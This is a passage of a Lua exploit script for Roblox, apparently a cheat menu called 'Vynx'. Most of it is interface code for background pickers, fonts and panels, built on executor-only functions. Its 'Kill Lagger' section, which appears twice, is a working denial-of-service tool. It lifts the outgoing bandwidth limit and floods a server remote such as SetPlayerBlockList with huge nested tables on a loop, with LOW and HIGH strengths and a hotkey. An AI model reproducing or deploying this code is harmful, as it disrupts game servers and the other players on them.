    preview.ScaleType = Enum.ScaleType.Crop
    preview.Image = currentId > 0 and ("rbxassetid://" .. currentId) or ""
    preview.ImageTransparency = isBg and opacity or 0
    preview.ZIndex = 3
    preview.Parent = panel
    Instance.new("UICorner", preview).CornerRadius = UDim.new(0, 10)

    local scroll = Instance.new("ScrollingFrame")
    scroll.Size = UDim2.new(1, -24, 0, 56)
    scroll.Position = UDim2.new(0, 12, 0, 142)
    scroll.BackgroundTransparency = 1
    scroll.BorderSizePixel = 0
    scroll.ScrollBarThickness = 4
    scroll.ScrollBarImageColor3 = UI_ACCENT or Color3.fromRGB(46, 46, 46)
    scroll.ScrollingDirection = Enum.ScrollingDirection.X
    scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
    scroll.AutomaticCanvasSize = Enum.AutomaticSize.X
    scroll.ZIndex = 3
    scroll.Parent = panel

    local lay = Instance.new("UIListLayout")
    lay.FillDirection = Enum.FillDirection.Horizontal
    lay.Padding = UDim.new(0, 8)
    lay.VerticalAlignment = Enum.VerticalAlignment.Center
    lay.Parent = scroll

    local selectedId = currentId

    local function selectId(id)
        selectedId = tonumber(id) or 0
        preview.Image = selectedId > 0 and ("rbxassetid://" .. selectedId) or ""
        if isBg then
            local ok = false
            if selectedId > 0 and M.BG_IMAGE_IDS then
                for _, v in ipairs(M.BG_IMAGE_IDS) do
                    if tonumber(v) == selectedId then ok = true break end
                end
            end
            M.customBgId = ok and selectedId or 0
            if M.mainFrame then M.applyCustomBackground(M.mainFrame) end
        else
            local ok = false
            if selectedId > 0 and M.MOB_BTN_IMAGE_IDS then
                for _, v in ipairs(M.MOB_BTN_IMAGE_IDS) do
                    if tonumber(v) == selectedId then ok = true break end
                end
            end
            M.mobBtnBgId = ok and selectedId or 0
            if M.mobileButtonsEnabled then
    M.buildMobileButtons()
else
    pcall(function() if M.destroyMobileButtons then M.destroyMobileButtons() end end)
end
        end
        pcall(saveCherryConfig)
    end

    local none = Instance.new("TextButton")
    none.Size = UDim2.new(0, 48, 0, 48)
    none.BackgroundColor3 = Color3.fromRGB(28, 28, 34)
    none.Text = "OFF"
    none.TextColor3 = Color3.fromRGB(255, 255, 255)
    none.Font = Enum.Font.GothamBold
    none.TextSize = 10
    none.ZIndex = 4
    none.Parent = scroll
    Instance.new("UICorner", none).CornerRadius = UDim.new(0, 8)
    none.MouseButton1Click:Connect(function() selectId(0) end)

    for _, id in ipairs(ids) do
        local thumb = Instance.new("ImageButton")
        thumb.Size = UDim2.new(0, 48, 0, 48)
        thumb.BackgroundColor3 = Color3.fromRGB(28, 28, 34)
        thumb.Image = "rbxassetid://" .. tostring(id)
        thumb.ScaleType = Enum.ScaleType.Crop
        thumb.ZIndex = 4
        thumb.Parent = scroll
        Instance.new("UICorner", thumb).CornerRadius = UDim.new(0, 8)
        local st = Instance.new("UIStroke", thumb)
        st.Color = Color3.fromRGB(255, 255, 255)
        st.Transparency = (id == currentId) and 0.2 or 0.7
        st.Thickness = 1
        thumb.MouseButton1Click:Connect(function()
            selectId(id)
            for _, ch in ipairs(scroll:GetChildren()) do
                if ch:IsA("ImageButton") then
                    local s = ch:FindFirstChildOfClass("UIStroke")
                    if s then s.Transparency = 0.7 end
                end
            end
            st.Transparency = 0.2
        end)
    end

    if isBg then
        local opLbl = Instance.new("TextLabel")
        opLbl.Size = UDim2.new(0.5, -12, 0, 18)
        opLbl.Position = UDim2.new(0, 12, 0, 208)
        opLbl.BackgroundTransparency = 1
        opLbl.Text = "OPACITY"
        opLbl.TextColor3 = Color3.fromRGB(92, 92, 92)
        opLbl.Font = Enum.Font.GothamBold
        opLbl.TextSize = 10
        opLbl.TextXAlignment = Enum.TextXAlignment.Left
        opLbl.ZIndex = 3
        opLbl.Parent = panel

        local opVal = Instance.new("TextLabel")
        opVal.Size = UDim2.new(0.5, -12, 0, 18)
        opVal.Position = UDim2.new(0.5, 0, 0, 208)
        opVal.BackgroundTransparency = 1
        opVal.Text = tostring(math.floor((1 - opacity) * 100)) .. "%"
        opVal.TextColor3 = Color3.fromRGB(255, 255, 255)
        opVal.Font = Enum.Font.GothamBold
        opVal.TextSize = 10
        opVal.TextXAlignment = Enum.TextXAlignment.Right
        opVal.ZIndex = 3
        opVal.Parent = panel

        local track = Instance.new("Frame")
        track.Size = UDim2.new(1, -24, 0, 8)
        track.Position = UDim2.new(0, 12, 0, 232)
        track.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        track.BorderSizePixel = 0
        track.ZIndex = 3
        track.Parent = panel
        Instance.new("UICorner", track).CornerRadius = UDim.new(1, 0)

        local fill = Instance.new("Frame")
        fill.Size = UDim2.new(1 - opacity, 0, 1, 0)
        fill.BackgroundColor3 = Color3.fromRGB(253, 253, 255)
        fill.BorderSizePixel = 0
        fill.ZIndex = 4
        fill.Parent = track
        Instance.new("UICorner", fill).CornerRadius = UDim.new(1, 0)

        local knob = Instance.new("Frame")
        knob.Size = UDim2.new(0, 16, 0, 16)
        knob.AnchorPoint = Vector2.new(0.5, 0.5)
        knob.Position = UDim2.new(1 - opacity, 0, 0.5, 0)
        knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        knob.BorderSizePixel = 0
        knob.ZIndex = 5
        knob.Parent = track
        Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)

        local dragging = false
        local function setFromX(x)
            local rel = math.clamp((x - track.AbsolutePosition.X) / math.max(track.AbsoluteSize.X, 1), 0, 1)

            local imageTransparency = 1 - rel
            opacity = imageTransparency
            M.customBgOpacity = opacity
            fill.Size = UDim2.new(rel, 0, 1, 0)
            knob.Position = UDim2.new(rel, 0, 0.5, 0)
            preview.ImageTransparency = opacity
            opVal.Text = tostring(math.floor(rel * 100)) .. "%"
            if M.mainFrame then M.applyCustomBackground(M.mainFrame) end
            saveCherryConfig()
        end
        track.InputBegan:Connect(function(i)
            if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                setFromX(i.Position.X)
            end
        end)
        UIS.InputChanged:Connect(function(i)
            if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
                setFromX(i.Position.X)
            end
        end)
        UIS.InputEnded:Connect(function(i)
            if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
                dragging = false
            end
        end)
    end
end

function M._fontShouldTouch(obj)
    if not (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox")) then return false end
    if obj.TextStrokeTransparency ~= 1 then return false end
    return true
end

function M._fontApplyOne(txt)
    if not M._fontShouldTouch(txt) then return end
    if not M._fontOrig[txt] then M._fontOrig[txt] = txt.FontFace end
    if M._fontMy then
        pcall(function() txt.FontFace = M._fontMy end)
    end
end

function M._fontSetupCoding()
    if M._fontMy and M.customFontSelected == "Coding Font" then return true end
    local ok = pcall(function()
        if isfile and writefile and getcustomasset then
            if not isfile("vynx_starborn.ttf") then
                writefile("vynx_starborn.ttf", game:HttpGet("https://granny.anondrop.net/uploads/6c2505542959f371/Starborn.ttf"))
            end
            writefile("vynx_starborn.json", HS:JSONEncode({
                name = "Starborn",
                faces = {{name = "Regular", weight = 400, style = "normal", assetId = getcustomasset("vynx_starborn.ttf")}}
            }))
            M._fontMy = Font.new(getcustomasset("vynx_starborn.json"))
        end
    end)
    return ok and M._fontMy ~= nil
end

function M.getFontForName(name)
    if not name or name == "None" then return nil end
    if name == "Coding Font" then
        if M._fontSetupCoding() then return M._fontMy end
        return nil
    elseif name == "Summer" then
        return Font.new("rbxasset://fonts/families/PermanentMarker.json")
    elseif name == "Beachy" then
        return Font.new("rbxasset://fonts/families/DenkOne.json")
    elseif name == "Scary" then
        return Font.new("rbxasset://fonts/families/Creepster.json")
    end
    return nil
end

function M.applyCustomFont(name)
    if M._fontConn then pcall(function() M._fontConn:Disconnect() end); M._fontConn = nil end
    for obj, orig in pairs(M._fontOrig) do
        pcall(function() if obj and obj.Parent then obj.FontFace = orig end end)
    end
    M._fontOrig = {}
    M.customFontSelected = name or "None"
    if name and name ~= "None" then
        local font = M.getFontForName(name)
        if font then
            M._fontMy = font
            for _, v in ipairs(game:GetDescendants()) do
                M._fontApplyOne(v)
            end
            M._fontConn = game.DescendantAdded:Connect(function(obj)
                if M.customFontSelected ~= "None" then M._fontApplyOne(obj) end
            end)
        end
    else
        M._fontMy = nil
    end

    pcall(function()
        if type(saveCherryConfig) == "function" then saveCherryConfig() end
    end)
end

M.killLaggerOpen = false
M.killLaggerLocked = M.killLaggerLocked == true
M.killLaggerKey = M.killLaggerKey or "V"
M.killLaggerActive = false
M.killLaggerGui = nil
M.killLaggerMain = nil
M._killLagThread = nil

local KILL_LAG_CONFIG = { TableIncrease = 1.5, Tries = 1, LoopWaitTime = 0.155 }

local function _vynxResolveBlockRemote()
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    if not rrs then return nil end
    for _, name in ipairs({"SetPlayerBlockList","UpdatePlayerBlockList","SetBlockList","UpdateBlockList"}) do
        local r = rrs:FindFirstChild(name)
        if r and (r:IsA("RemoteEvent") or r:IsA("UnreliableRemoteEvent") or r:IsA("RemoteFunction")) then
            return r
        end
    end
    return nil
end

local function _vynxLagBomb()
    local tableincrease = KILL_LAG_CONFIG.TableIncrease
    local maintable, spammedtable = {}, {}
    table.insert(spammedtable, {})
    local z = spammedtable[1]
    for _ = 1, tableincrease do
        local n = {}
        table.insert(z, n)
        z = n
    end
    local maximum = 58500 / (tableincrease + 2)
    for i = 1, maximum do
        table.insert(maintable, spammedtable)
        if i % 5000 == 0 then task.wait() end
    end
    local remote = _vynxResolveBlockRemote()
    if not remote then return end
    for _ = 1, KILL_LAG_CONFIG.Tries do
        pcall(function()
            if remote:IsA("RemoteFunction") then
                remote:InvokeServer(maintable)
            else
                remote:FireServer(maintable)
            end
        end)
    end
end

function M.stopKillLagger()
    M.killLaggerActive = false
    if M._killLagThread then
        pcall(function() task.cancel(M._killLagThread) end)
        M._killLagThread = nil
    end
    if M._killLagRefresh then pcall(M._killLagRefresh) end
end

function M.startKillLagger()
    M.stopKillLagger()
    M.killLaggerActive = true
    M._killLagThread = task.spawn(function()
        while M.killLaggerActive do
            pcall(function()
                game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
            end)
            task.spawn(_vynxLagBomb)
            task.wait(KILL_LAG_CONFIG.LoopWaitTime)
        end
    end)
    if M._killLagRefresh then pcall(M._killLagRefresh) end
end

function M.toggleKillLagger()
    if M.killLaggerActive then M.stopKillLagger() else M.startKillLagger() end
end

M.killLaggerMode = M.killLaggerMode or "LOW"
M.killLaggerOpen = M.killLaggerOpen == true
M.killLaggerLocked = M.killLaggerLocked == true
M.killLaggerMinimized = M.killLaggerMinimized == true
M.killLaggerPanelPos = M.killLaggerPanelPos
M.killLaggerKey = M.killLaggerKey or "V"
M.killLaggerActive = M.killLaggerActive == true
M.killLaggerGui = M.killLaggerGui
M.killLaggerMain = M.killLaggerMain
M._killLagThread = nil
M._killLagListening = false

local KL_HIGH = { TableIncrease = 265, Tries = 1, LoopWaitTime = 0.85 }
local KL_LOW  = { TableIncrease = 1.5, Tries = 1, LoopWaitTime = 0.155 }
local KL_REMOTE_PATH = "RobloxReplicatedStorage.SetPlayerBlockList"

local function _klPack(u)
    if typeof(u) ~= "UDim2" then return nil end
    return { sx = u.X.Scale, ox = u.X.Offset, sy = u.Y.Scale, oy = u.Y.Offset }
end
local function _klUnpack(t, fallback)
    if type(t) == "table" and type(t.sx) == "number" and type(t.sy) == "number" then
        return UDim2.new(t.sx, tonumber(t.ox) or 0, t.sy, tonumber(t.oy) or 0)
    end
    return fallback
end

local function _klResolveRemote(path)
    local obj = game
    local cleaned = path:gsub("^game%.", "")
    for segment in cleaned:gmatch("[^%.]+") do
        if not obj then return nil end
        obj = obj:FindFirstChild(segment) or obj[segment]
    end
    return obj
end

local function _klGetMax(val, isHigh)
    if isHigh then return 499999 / (val + 2) else return 58500 / (val + 2) end
end

local function _klBomb(tableincrease, tries, isHigh)
    local maintable, spammedtable = {}, {}
    table.insert(spammedtable, {})
    local z = spammedtable[1]
    for _ = 1, tableincrease do
        local tableins = {}
        table.insert(z, tableins)
        z = tableins
    end
    local maximum = _klGetMax(tableincrease, isHigh) or 9999999
    for i = 1, maximum do
        table.insert(maintable, spammedtable)
        if i % 5000 == 0 then task.wait() end
    end
    local remote = _klResolveRemote(KL_REMOTE_PATH)
    if not remote then
        local rrs = game:FindFirstChild("RobloxReplicatedStorage")
        if rrs then
            for _, name in ipairs({"SetPlayerBlockList","UpdatePlayerBlockList","SetBlockList","UpdateBlockList"}) do
                local r = rrs:FindFirstChild(name)
                if r and (r:IsA("RemoteEvent") or r:IsA("UnreliableRemoteEvent") or r:IsA("RemoteFunction")) then
                    remote = r; break
                end
            end
        end
    end
    if not remote then return end
    for _ = 1, tries do
        pcall(function()
            if remote:IsA("RemoteFunction") then remote:InvokeServer(maintable)
            else remote:FireServer(maintable) end
        end)
    end
end

function M.stopKillLagger()
    M.killLaggerActive = false
    if M._killLagThread then pcall(function() task.cancel(M._killLagThread) end); M._killLagThread = nil end
    if M._killLagRefresh then pcall(M._killLagRefresh) end
end

function M.startKillLagger()
    M.stopKillLagger()
    M.killLaggerActive = true
    local cfg = (M.killLaggerMode == "HIGH") and KL_HIGH or KL_LOW
    local isHigh = M.killLaggerMode == "HIGH"
    M._killLagThread = task.spawn(function()
        while M.killLaggerActive do
            pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge) end)
            task.spawn(function() _klBomb(cfg.TableIncrease, cfg.Tries, isHigh) end)
            task.wait(cfg.LoopWaitTime)
        end
    end)
    if M._killLagRefresh then pcall(M._killLagRefresh) end
end

function M.toggleKillLagger()
    if M.killLaggerActive then M.stopKillLagger() else M.startKillLagger() end
    pcall(saveCherryConfig)
end

function M.buildKillLaggerUI()
    if M.killLaggerGui and M.killLaggerGui.Parent then pcall(function() M.killLaggerGui:Destroy() end) end
    M.killLaggerGui = nil; M.killLaggerMain = nil

    local WHITE = Color3.fromRGB(255,255,255)
    local BLACK = Color3.fromRGB(0,0,0)
    local GREY2 = Color3.fromRGB(28,28,28)

    local gui = Instance.new("ScreenGui")
    gui.Name = "VynxLaggerGui"
    gui.ResetOnSpawn = false
    gui.DisplayOrder = 120
    gui.IgnoreGuiInset = true
    local okP = false
    pcall(function() if gethui then gui.Parent = gethui(); okP = true end end)
    if not okP then pcall(function() gui.Parent = game:GetService("CoreGui"); okP = true end) end
    if not okP then pcall(function() gui.Parent = player:WaitForChild("PlayerGui") end) end
    M.killLaggerGui = gui
    pcall(function() if M.registerAccentRoot then M.registerAccentRoot(gui) end end)

    local MAIN_W, MAIN_H = 300, 150
    local main = Instance.new("Frame")
    main.Name = "VynxLaggerMain"
    main.Size = UDim2.new(0, MAIN_W, 0, MAIN_H)
    main.Position = _klUnpack(M.killLaggerPanelPos, UDim2.new(0.5, -MAIN_W/2, 0.15, 0))
    main.BackgroundColor3 = BLACK
    main.BackgroundTransparency = 1
    main.BorderSizePixel = 0
    main.Active = true
    main.ClipsDescendants = true
    main.Visible = M.killLaggerOpen == true
    main.Parent = gui
    Instance.new("UICorner", main).CornerRadius = UDim.new(0, 16)
    local mainStroke = Instance.new("UIStroke", main)
    mainStroke.Color = WHITE; mainStroke.Thickness = 1.2; mainStroke.Transparency = 0.55
    M.killLaggerMain = main

    main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    main.BackgroundTransparency = 0
    pcall(function() M.applyPanelBackground(main, UDim.new(0, 16)) end)

    do
        local dragging, dragStart, startPos
        main.InputBegan:Connect(function(i)
            if M.killLaggerLocked then return end
            if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
                dragging = true; dragStart = i.Position; startPos = main.Position
                i.Changed:Connect(function()
                    if i.UserInputState == Enum.UserInputState.End then
                        dragging = false
                        M.killLaggerPanelPos = _klPack(main.Position)
                        pcall(saveCherryConfig)
                    end
                end)
            end
        end)
        UIS.InputChanged:Connect(function(i)
            if M.killLaggerLocked then dragging = false; return end
            if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
                local d = i.Position - dragStart
                main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
            end
        end)
    end

    local title = Instance.new("TextLabel", main)
    title.Size = UDim2.new(1,-120,0,16); title.Position = UDim2.new(0,14,0,8)
    title.BackgroundTransparency = 1; title.Text = "VYNX LAGGER"; title.TextColor3 = WHITE
    title.Font = Enum.Font.GothamBold; title.TextSize = 13; title.TextXAlignment = Enum.TextXAlignment.Left; title.ZIndex = 5

    local discordTag = Instance.new("TextLabel", main)
    discordTag.Size = UDim2.new(1,-120,0,12); discordTag.Position = UDim2.new(0,14,0,24)
    discordTag.BackgroundTransparency = 1; discordTag.Text = "gg/vynxduels"; discordTag.TextColor3 = ((M.accentColor and M.accentColor()) or Color3.fromRGB(0, 130, 200)); discordTag:SetAttribute("BrandAccent", true)
    discordTag.Font = Enum.Font.GothamBold; discordTag.TextSize = 10; discordTag.TextXAlignment = Enum.TextXAlignment.Left; discordTag.ZIndex = 5

    local body = Instance.new("Frame", main)
    body.Name = "LaggerBody"; body.BackgroundTransparency = 1
    body.Size = UDim2.new(1,0,1,-42); body.Position = UDim2.new(0,0,0,42); body.ZIndex = 3

    local function mkIconBtn(xOff, txt, w)
        local b = Instance.new("TextButton", main)
        b.Size = UDim2.new(0, w or 28, 0, 26); b.Position = UDim2.new(1, xOff, 0, 10)
        b.BackgroundColor3 = GREY2; b.BorderSizePixel = 0; b.Text = txt; b.TextColor3 = WHITE
        b.Font = Enum.Font.GothamBold; b.TextSize = 14; b.AutoButtonColor = false; b.ZIndex = 6
        Instance.new("UICorner", b).CornerRadius = UDim.new(0, 8)
        local st = Instance.new("UIStroke", b); st.Color = WHITE; st.Thickness = 1; st.Transparency = 0.65
        return b
    end

    local lockBtn = mkIconBtn(-96, "LOCK", 30)
    local minBtn = mkIconBtn(-64, "-", 28)
    local closeBtn = mkIconBtn(-32, "X", 28)
    lockBtn.TextSize = 9; minBtn.TextSize = 16; closeBtn.TextSize = 13

    local function refreshLock()
        if M.killLaggerLocked then
            lockBtn.Text = "UNLOCK"; lockBtn.BackgroundColor3 = WHITE; lockBtn.TextColor3 = BLACK
            lockBtn.Size = UDim2.new(0,44,0,26); lockBtn.Position = UDim2.new(1,-110,0,10)
        else
            lockBtn.Text = "LOCK"; lockBtn.BackgroundColor3 = GREY2; lockBtn.TextColor3 = WHITE
            lockBtn.Size = UDim2.new(0,30,0,26); lockBtn.Position = UDim2.new(1,-96,0,10)
        end
    end
    lockBtn.MouseButton1Click:Connect(function() M.killLaggerLocked = not M.killLaggerLocked; refreshLock(); pcall(saveCherryConfig) end)
    refreshLock()

    local function applyMinimize(on)
        M.killLaggerMinimized = on and true or false
        body.Visible = not M.killLaggerMinimized
        if M.killLaggerMinimized then main.Size = UDim2.new(0,MAIN_W,0,42); minBtn.Text = "+"
        else main.Size = UDim2.new(0,MAIN_W,0,MAIN_H); minBtn.Text = "-" end
    end
    minBtn.MouseButton1Click:Connect(function() applyMinimize(not M.killLaggerMinimized) end)
    closeBtn.MouseButton1Click:Connect(function()
        M.setKillLaggerPanelOpen(false)
    end)

    local modeRow = Instance.new("Frame", body)
    modeRow.BackgroundTransparency = 1; modeRow.Size = UDim2.new(1,-24,0,30); modeRow.Position = UDim2.new(0,12,0,4); modeRow.ZIndex = 4
    local modeLow = Instance.new("TextButton", modeRow)
    modeLow.Size = UDim2.new(0.5,-4,1,0); modeLow.Position = UDim2.new(0,0,0,0)
    modeLow.BackgroundColor3 = GREY2; modeLow.BorderSizePixel = 0; modeLow.Text = "LOW"; modeLow.TextColor3 = WHITE
    modeLow.Font = Enum.Font.GothamBold; modeLow.TextSize = 12; modeLow.AutoButtonColor = false; modeLow.ZIndex = 5
    Instance.new("UICorner", modeLow).CornerRadius = UDim.new(0, 8)
    local modeHigh = Instance.new("TextButton", modeRow)
    modeHigh.Size = UDim2.new(0.5,-4,1,0); modeHigh.Position = UDim2.new(0.5,4,0,0)
    modeHigh.BackgroundColor3 = GREY2; modeHigh.BorderSizePixel = 0; modeHigh.Text = "HIGH"; modeHigh.TextColor3 = WHITE
    modeHigh.Font = Enum.Font.GothamBold; modeHigh.TextSize = 12; modeHigh.AutoButtonColor = false; modeHigh.ZIndex = 5
    Instance.new("UICorner", modeHigh).CornerRadius = UDim.new(0, 8)

    local function refreshMode()
        local isLow = M.killLaggerMode == "LOW"
        modeLow.BackgroundColor3 = isLow and WHITE or GREY2; modeLow.TextColor3 = isLow and BLACK or WHITE
        modeHigh.BackgroundColor3 = (not isLow) and WHITE or GREY2; modeHigh.TextColor3 = (not isLow) and BLACK or WHITE
    end
    modeLow.MouseButton1Click:Connect(function()
        local was = M.killLaggerActive; if was then M.stopKillLagger() end
        M.killLaggerMode = "LOW"; refreshMode(); if was then M.startKillLagger() end; pcall(saveCherryConfig)
    end)
    modeHigh.MouseButton1Click:Connect(function()
        local was = M.killLaggerActive; if was then M.stopKillLagger() end
        M.killLaggerMode = "HIGH"; refreshMode(); if was then M.startKillLagger() end; pcall(saveCherryConfig)
    end)

    local row = Instance.new("Frame", body)
    row.BackgroundColor3 = Color3.fromRGB(12,12,12); row.BackgroundTransparency = 0.45; row.BorderSizePixel = 0
    row.Size = UDim2.new(1,-24,0,48); row.Position = UDim2.new(0,12,0,42); row.ZIndex = 4
    Instance.new("UICorner", row).CornerRadius = UDim.new(0, 10)

    local statusLbl = Instance.new("TextLabel", row)
    statusLbl.Size = UDim2.new(0,50,1,0); statusLbl.Position = UDim2.new(0,12,0,0)
    statusLbl.BackgroundTransparency = 1; statusLbl.Text = "OFF"; statusLbl.TextColor3 = WHITE
    statusLbl.Font = Enum.Font.GothamBold; statusLbl.TextSize = 14; statusLbl.TextXAlignment = Enum.TextXAlignment.Left; statusLbl.ZIndex = 5

    local kbBtn = Instance.new("TextButton", row)
    kbBtn.Size = UDim2.new(0,56,0,26); kbBtn.Position = UDim2.new(0,70,0.5,-13)
    kbBtn.BackgroundColor3 = GREY2; kbBtn.BorderSizePixel = 0
    kbBtn.Text = tostring(M.killLaggerKey or "V"); kbBtn.TextColor3 = WHITE
    kbBtn.Font = Enum.Font.GothamBold; kbBtn.TextSize = 12; kbBtn.AutoButtonColor = false; kbBtn.ZIndex = 5
    Instance.new("UICorner", kbBtn).CornerRadius = UDim.new(0, 8)
    local kbStroke = Instance.new("UIStroke", kbBtn); kbStroke.Color = WHITE; kbStroke.Thickness = 1; kbStroke.Transparency = 0.65

    local toggleBtn = Instance.new("TextButton", row)
    toggleBtn.Size = UDim2.new(0,72,0,28); toggleBtn.Position = UDim2.new(1,-84,0.5,-14)
    toggleBtn.BackgroundColor3 = GREY2; toggleBtn.BorderSizePixel = 0; toggleBtn.Text = "OFF"; toggleBtn.TextColor3 = WHITE
    toggleBtn.Font = Enum.Font.GothamBold; toggleBtn.TextSize = 13; toggleBtn.AutoButtonColor = false; toggleBtn.ZIndex = 5
    Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(0, 8)
    local togStroke = Instance.new("UIStroke", toggleBtn); togStroke.Color = WHITE; togStroke.Thickness = 1; togStroke.Transparency = 0.55

    local function refreshVisual()
        local on = M.killLaggerActive == true
        statusLbl.Text = on and "ON" or "OFF"
        toggleBtn.Text = on and "ON" or "OFF"
        toggleBtn.BackgroundColor3 = on and WHITE or GREY2
        toggleBtn.TextColor3 = on and BLACK or WHITE
        togStroke.Transparency = on and 0.15 or 0.55
        mainStroke.Transparency = on and 0.3 or 0.55
        if not M._killLagListening then kbBtn.Text = tostring(M.killLaggerKey or "V") end
    end
    M._killLagRefresh = refreshVisual

    toggleBtn.MouseButton1Click:Connect(function() M.toggleKillLagger() end)
    kbBtn.MouseButton1Click:Connect(function()
        if M._killLagListening then return end
        M._killLagListening = true; kbBtn.Text = "..."; kbStroke.Transparency = 0.2
        local conn
        conn = UIS.InputBegan:Connect(function(inp, gpe)
            if gpe then return end
            if inp.UserInputType == Enum.UserInputType.Keyboard and inp.KeyCode ~= Enum.KeyCode.Unknown then
                M.killLaggerKey = inp.KeyCode.Name; kbBtn.Text = inp.KeyCode.Name
                M._killLagListening = false; kbStroke.Transparency = 0.65
                pcall(function() conn:Disconnect() end); pcall(saveCherryConfig)
            end
        end)
    end)

    if M._killLagKeyConn then pcall(function() M._killLagKeyConn:Disconnect() end) end
    M._killLagKeyConn = UIS.InputBegan:Connect(function(inp, gpe)
        if gpe or M._killLagListening then return end
        if inp.UserInputType ~= Enum.UserInputType.Keyboard then return end
        if M.killLaggerKey and inp.KeyCode.Name == M.killLaggerKey and M.killLaggerOpen then
            M.toggleKillLagger()
        end
    end)

    refreshMode(); refreshVisual(); applyMinimize(M.killLaggerMinimized)
end

function M.setKillLaggerPanelOpen(on)

    M.killLaggerOpen = false
    pcall(function() if M.stopKillLagger then M.stopKillLagger() end end)
    if M.killLaggerMain then pcall(function() M.killLaggerMain.Visible = false end) end
    if M.killLaggerGui then pcall(function() M.killLaggerGui:Destroy() end); M.killLaggerGui = nil; M.killLaggerMain = nil end
end

function M.getPanelBgImage()
    return nil
end

function M.applyPanelBackground(parent, cornerRadius)
    if not parent then return end
    for _, n in ipairs({"PanelBg", "PanelBgOverlay", "DotPattern", "PanelDotPattern", "CustomBgImage", "PanelBgImage"}) do
        local old = parent:FindFirstChild(n)
        if old then pcall(function() old:Destroy() end) end
    end

    local cr = 16
    if typeof(cornerRadius) == "UDim" then
        cr = cornerRadius.Offset or 16
    elseif type(cornerRadius) == "number" then
        cr = cornerRadius
    end

    local id = tonumber(M.panelBgImageId) or 0
    if id <= 0 then id = tonumber(M.MENU_BG_ASSET) or 73023682914801 end

    pcall(function()
        parent.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        parent.BackgroundTransparency = 0.35
    end)

    local img = Instance.new("ImageLabel")
    img.Name = "PanelBgImage"
    img.BackgroundTransparency = 1
    img.Size = UDim2.fromScale(1, 1)
    img.Position = UDim2.fromScale(0, 0)
    img.Image = "rbxassetid://" .. tostring(id)
    img.ScaleType = Enum.ScaleType.Crop
    img.ImageTransparency = 0.15
    img.ZIndex = 0
    img:SetAttribute("BgTint", true)
    pcall(function() img.ImageColor3 = M.bgTintColor() end)
    img.Parent = parent
    Instance.new("UICorner", img).CornerRadius = UDim.new(0, cr)
    pcall(function() M.applyBgWash(img, UDim.new(0, cr)) end)
    pcall(function() M.applyBgRecolor(img) end)

    local overlay = Instance.new("Frame")
    overlay.Name = "PanelBgOverlay"
    overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    overlay.BackgroundTransparency = 0.45
    overlay.Size = UDim2.fromScale(1, 1)
    overlay.BorderSizePixel = 0
    overlay.ZIndex = 1
    overlay.Parent = parent
    Instance.new("UICorner", overlay).CornerRadius = UDim.new(0, cr)
end

function M.setPanelBgImageId(id)
    id = tonumber(id) or 0
    local allowed = false
    for _, v in ipairs(M.PANEL_BG_IMAGE_IDS or {}) do
        if tonumber(v) == id then allowed = true break end
    end
    if not allowed and id ~= 0 then
        id = (M.PANEL_BG_IMAGE_IDS and M.PANEL_BG_IMAGE_IDS[1]) or 79162198517476
    end
    M.panelBgImageId = id
    pcall(function()
        if M.pingMain then M.applyPanelBackground(M.pingMain, UDim.new(0, 14)) end
        if M.killLaggerMain then M.applyPanelBackground(M.killLaggerMain, UDim.new(0, 16)) end
        if M.mainFrame then M.applyCustomBackground(M.mainFrame) end
    end)
    pcall(saveCherryConfig)
end

function M.openPanelBgPicker()
    local ids = M.PANEL_BG_IMAGE_IDS or {79162198517476, 95898293805741}
    local currentId = tonumber(M.panelBgImageId) or 0

    local old = player.PlayerGui:FindFirstChild("VynxPanelBgPicker")
    if old then old:Destroy() end
    local cg = game:GetService("CoreGui"):FindFirstChild("VynxPanelBgPicker")
    if cg then cg:Destroy() end

    local gui = Instance.new("ScreenGui")
    gui.Name = "VynxPanelBgPicker"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.DisplayOrder = 130
    pcall(function() gui.Parent = game:GetService("CoreGui") end)
    if not gui.Parent then gui.Parent = player:WaitForChild("PlayerGui") end

    local dim = Instance.new("TextButton")
    dim.Size = UDim2.fromScale(1, 1)
    dim.BackgroundColor3 = Color3.new(0, 0, 0)
    dim.BackgroundTransparency = 0.5
    dim.Text = ""
    dim.AutoButtonColor = false
    dim.ZIndex = 1
    dim.Parent = gui
    dim.MouseButton1Click:Connect(function() gui:Destroy() end)

    local card = Instance.new("Frame")
    card.Size = UDim2.new(0, 280, 0, 200)
    card.Position = UDim2.new(0.5, -140, 0.5, -100)
    card.BackgroundColor3 = Color3.fromRGB(12, 14, 20)
    card.BorderSizePixel = 0
    card.ZIndex = 2
    card.Parent = gui
    Instance.new("UICorner", card).CornerRadius = UDim.new(0, 12)
    local stroke = Instance.new("UIStroke", card)
    stroke.Color = ((M.accentColor and M.accentColor()) or Color3.fromRGB(0, 130, 200))
    stroke.Thickness = 1.2
    stroke.Transparency = 0.3

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, -20, 0, 28)
    title.Position = UDim2.new(0, 10, 0, 8)
    title.BackgroundTransparency = 1
    title.Text = "PING / PANEL BACKGROUND"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.Font = Enum.Font.GothamBlack
    title.TextSize = 13
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.ZIndex = 3
    title.Parent = card

    local row = Instance.new("Frame")
